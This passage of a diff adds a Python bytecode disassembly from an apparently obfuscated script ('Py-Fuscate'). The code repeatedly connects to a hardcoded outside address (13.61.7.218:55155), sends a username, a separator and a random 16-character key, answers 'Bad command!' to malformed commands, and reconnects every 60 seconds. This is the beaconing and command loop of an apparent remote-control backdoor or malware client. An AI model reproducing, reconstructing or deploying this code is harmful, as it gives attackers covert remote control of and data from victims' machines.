+            1360 LOAD_ATTR               33 (encode + NULL|self)
+            1380 LOAD_CONST              16 ('utf-8')
+            1382 CALL                     1
+            1390 CALL                     1
+            1398 POP_TOP
+
+ 127        1400 POP_EXCEPT
+            1402 JUMP_BACKWARD           59 (to 1288)
+
+None     >> 1406 PUSH_EXC_INFO
+
+ 128        1408 POP_TOP
+
+ 129        1410 POP_EXCEPT
+            1412 POP_EXCEPT
+            1414 JUMP_BACKWARD           65 (to 1288)
+
+None     >> 1418 COPY                     3
+            1420 POP_EXCEPT
+            1422 RERAISE                  1
+         >> 1424 COPY                     3
+            1426 POP_EXCEPT
+            1428 RERAISE                  1
+         >> 1430 PUSH_EXC_INFO
+
+ 144        1432 POP_TOP
+
+ 145        1434 NOP
+
+ 146        1436 LOAD_FAST                0 (client)
+            1438 LOAD_ATTR               15 (send + NULL|self)
+            1458 LOAD_CONST              19 ('Bad command!')
+            1460 LOAD_ATTR               33 (encode + NULL|self)
+            1480 LOAD_CONST              20 ('ascii')
+            1482 CALL                     1
+            1490 CALL                     1
+            1498 POP_TOP
+            1500 POP_EXCEPT
+            1502 JUMP_BACKWARD_NO_INTERRUPT 108 (to 1288)
+
+None     >> 1504 PUSH_EXC_INFO
+
+ 147        1506 POP_TOP
+
+ 148        1508 POP_EXCEPT
+            1510 POP_EXCEPT
+            1512 JUMP_BACKWARD_NO_INTERRUPT 113 (to 1288)
+
+None     >> 1514 COPY                     3
+            1516 POP_EXCEPT
+            1518 RERAISE                  1
+         >> 1520 COPY                     3
+            1522 POP_EXCEPT
+            1524 RERAISE                  1
+         >> 1526 PUSH_EXC_INFO
+
+ 149        1528 POP_TOP
+
+ 150        1530 NOP
+
+ 151     >> 1532 NOP
+
+ 152        1534 LOAD_FAST                0 (client)
+            1536 LOAD_ATTR               41 (close + NULL|self)
+            1556 CALL                     0
+            1564 POP_TOP
+
+ 153        1566 LOAD_GLOBAL             42 (socket)
+            1576 LOAD_ATTR               42 (socket)
+            1596 PUSH_NULL
+            1598 LOAD_GLOBAL             42 (socket)
+            1608 LOAD_ATTR               44 (AF_INET)
+            1628 LOAD_GLOBAL             42 (socket)
+            1638 LOAD_ATTR               46 (SOCK_STREAM)
+            1658 CALL                     2
+            1666 STORE_FAST               0 (client)
+
+ 154        1668 LOAD_FAST                0 (client)
+            1670 LOAD_ATTR               49 (connect + NULL|self)
+            1690 LOAD_CONST              21 (('13.61.7.218', 55155))
+            1692 CALL                     1
+            1700 POP_TOP
+
+ 155        1702 LOAD_CONST              17 ('')
+            1704 LOAD_ATTR               51 (join + NULL|self)
+            1724 LOAD_CONST              22 (<code object <genexpr> at 0x7f4923e079b0, file "Py-Fuscate", line 155>)
+            1726 MAKE_FUNCTION
+            1728 LOAD_GLOBAL             53 (range + NULL)
+            1738 LOAD_CONST              23 (16)
+            1740 CALL                     1
+            1748 GET_ITER
+            1750 CALL                     0
+            1758 CALL                     1
+            1766 STORE_FAST               1 (k)
+
+ 156        1768 LOAD_FAST                0 (client)
+            1770 LOAD_ATTR               15 (send + NULL|self)
+            1790 LOAD_GLOBAL             54 (user)
+            1800 FORMAT_SIMPLE
+            1802 LOAD_GLOBAL             56 (SEPARATOR)
+            1812 FORMAT_SIMPLE
+            1814 LOAD_FAST                1 (k)
+            1816 FORMAT_SIMPLE
+            1818 BUILD_STRING             3
+            1820 LOAD_ATTR               33 (encode + NULL|self)
+            1840 CALL                     0
+            1848 CALL                     1
+            1856 POP_TOP
+
+ 157        1858 LOAD_FAST                0 (client)
+            1860 LOAD_ATTR               59 (settimeout + NULL|self)
+            1880 LOAD_CONST              24 (600)
+            1882 CALL                     1
+            1890 POP_TOP
+
+ 158        1892 LOAD_GLOBAL              6 (time)
+            1902 LOAD_ATTR                8 (sleep)
+            1922 PUSH_NULL
+            1924 LOAD_CONST              25 (60)
+            1926 CALL                     1
+            1934 POP_TOP
+
+ 159        1936 POP_EXCEPT
+            1938 EXTENDED_ARG             1
+            1940 JUMP_BACKWARD          328 (to 1288)
+
+None     >> 1944 PUSH_EXC_INFO
+
+ 160        1946 POP_TOP
+
+ 161        1948 LOAD_GLOBAL              6 (time)
+            1958 LOAD_ATTR                8 (sleep)
+            1978 PUSH_NULL
+            1980 LOAD_CONST              25 (60)
+            1982 CALL                     1
+            1990 POP_TOP
+            1992 POP_EXCEPT
+            1994 JUMP_FORWARD             3 (to 2002)
+
+None     >> 1996 COPY                     3
+            1998 POP_EXCEPT
+            2000 RERAISE                  1
+
+ 150     >> 2002 JUMP_BACKWARD          237 (to 1532)
+
+None     >> 2006 COPY                     3
+            2008 POP_EXCEPT
+            2010 RERAISE                  1
+ExceptionTable:
+  6 to 258 -> 1526 [0]
+  268 to 336 -> 1526 [0]
+  342 to 432 -> 1526 [0]
+  438 to 508 -> 1526 [0]
+  512 to 590 -> 1330 [0]
+  592 to 624 -> 1294 [1] lasti
+  626 to 836 -> 1330 [0]
+  840 to 874 -> 1526 [0]
+  878 to 1052 -> 1430 [0]
+  1056 to 1286 -> 1430 [0]
+  1294 to 1312 -> 1324 [3] lasti
+  1314 to 1328 -> 1330 [0]
+  1330 to 1332 -> 1424 [1] lasti
+  1336 to 1398 -> 1406 [1]
+  1400 to 1400 -> 1526 [0]
+  1406 to 1408 -> 1418 [2] lasti
+  1410 to 1410 -> 1424 [1] lasti
+  1412 to 1412 -> 1526 [0]
+  1418 to 1422 -> 1424 [1] lasti
+  1424 to 1428 -> 1526 [0]
+  1430 to 1432 -> 1520 [1] lasti
+  1436 to 1498 -> 1504 [1]
+  1500 to 1500 -> 1526 [0]
+  1504 to 1506 -> 1514 [2] lasti
+  1508 to 1508 -> 1520 [1] lasti
+  1510 to 1510 -> 1526 [0]
+  1514 to 1518 -> 1520 [1] lasti
+  1520 to 1524 -> 1526 [0]
+  1526 to 1530 -> 2006 [1] lasti
+  1534 to 1934 -> 1944 [1]
+  1944 to 1990 -> 1996 [2] lasti
+  1992 to 2004 -> 2006 [1] lasti
+
+Disassembly of <code object <genexpr> at 0x7f4923e079b0, file "Py-Fuscate", line 155>:
+ 155           0 RETURN_GENERATOR
+               2 POP_TOP
+               4 RESUME                   0
+               6 LOAD_FAST                0 (.0)
+               8 GET_ITER
+         >>   10 FOR_ITER                72 (to 158)
+              14 STORE_FAST               1 (_)
+              16 LOAD_GLOBAL              0 (random)
+              26 LOAD_ATTR                2 (SystemRandom)
+              46 PUSH_NULL
+              48 CALL                     0
+              56 LOAD_ATTR                5 (choice + NULL|self)
+              76 LOAD_GLOBAL              6 (string)
+              86 LOAD_ATTR                8 (ascii_letters)
+             106 LOAD_GLOBAL              6 (string)
+             116 LOAD_ATTR               10 (digits)
+             136 BINARY_OP                0 (+)
+             140 CALL                     1
+             148 YIELD_VALUE              0
+             150 RESUME                   5
+             152 POP_TOP
+             154 JUMP_BACKWARD           74 (to 10)
+         >>  158 END_FOR
+             160 POP_TOP
+             162 RETURN_CONST             0 (None)
+
+None     >>  164 CALL_INTRINSIC_1         3 (INTRINSIC_STOPITERATION_ERROR)
+             166 RERAISE                  1
+ExceptionTable:
+  4 to 162 -> 164 [0] lasti
+
+Disassembly of <code object <genexpr> at 0x7f4923e07b20, file "Py-Fuscate", line 168>:
+ 168           0 RETURN_GENERATOR
+               2 POP_TOP
+               4 RESUME                   0
+               6 LOAD_FAST                0 (.0)
+               8 GET_ITER
+         >>   10 FOR_ITER                72 (to 158)
+              14 STORE_FAST               1 (_)
+              16 LOAD_GLOBAL              0 (random)
+              26 LOAD_ATTR                2 (SystemRandom)
+              46 PUSH_NULL
+              48 CALL                     0
+              56 LOAD_ATTR                5 (choice + NULL|self)
+              76 LOAD_GLOBAL              6 (string)
+              86 LOAD_ATTR                8 (ascii_letters)
+             106 LOAD_GLOBAL              6 (string)
+             116 LOAD_ATTR               10 (digits)
+             136 BINARY_OP                0 (+)
+             140 CALL                     1
+             148 YIELD_VALUE              0
+             150 RESUME                   5
+             152 POP_TOP
+             154 JUMP_BACKWARD           74 (to 10)
+         >>  158 END_FOR
+             160 POP_TOP
+             162 RETURN_CONST             0 (None)
+
+None     >>  164 CALL_INTRINSIC_1         3 (INTRINSIC_STOPITERATION_ERROR)
+             166 RERAISE                  1
+ExceptionTable:
+  4 to 162 -> 164 [0] lasti
